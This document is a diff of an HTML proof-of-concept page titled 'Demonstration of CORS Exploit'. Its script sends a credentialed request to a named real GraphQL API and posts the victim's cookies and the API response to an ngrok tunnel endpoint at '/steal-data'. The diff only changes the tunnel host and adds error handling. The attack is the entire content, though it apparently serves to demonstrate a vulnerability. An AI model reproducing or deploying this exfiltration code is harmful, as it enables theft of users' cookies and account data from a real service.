@@ -7,28 +7,35 @@
 </head>
 <body>
     <h1><u>Demonstration of CORS Exploit</u></h1>
-    <script>
-        // Make a request to the vulnerable API
-        fetch('https://api.consumer.worldcoin.org/v1/graphql', {
+<script>
+    // Capture the user's cookies
+    const userCookies = document.cookie;
+
+    // Make a request to the vulnerable API
+    fetch('https://api.consumer.worldcoin.org/v1/graphql', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json',
+            'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/' 
+        },
+        body: JSON.stringify({ query: `{ publicData { id name } }` })
+    })
+    .then(response => response.text())
+    .then(data => {
+        // Send the cookies and response data to your server
+        fetch('https://827b-2401-4900-1c82-da4e-3a56-a4c3-7e9-3a2d.ngrok-free.app/steal-data', {
             method: 'POST',
-            credentials: 'include',  // Include user cookies in the request
+            body: JSON.stringify({ cookies: userCookies, response: data }),
             headers: {
-                'Content-Type': 'application/json',
-                'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/'  // Set your domain
-            },
-            body: JSON.stringify({ query: `{ publicData { id name } }` })  // Example query
+                'Content-Type': 'application/json'
+            }
         })
-        .then(response => response.text())
-        .then(data => {
-            // Send the cookies and response data to your server for demonstration
-            fetch('https://644a-2401-4900-1c82-da4e-c470-a27-bb8b-2114.ngrok-free.app/steal-data', {
-                method: 'POST',
-                body: JSON.stringify({ cookies: document.cookie, response: data }),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            });
-        });
-    </script>
+        .then(res => res.text())
+        .then(serverResponse => console.log('Server received:', serverResponse))
+        .catch(error => console.error('Error sending data to server:', error));
+    })
+    .catch(error => console.error('Error fetching API:', error));
+</script>
 </body>
 </html>
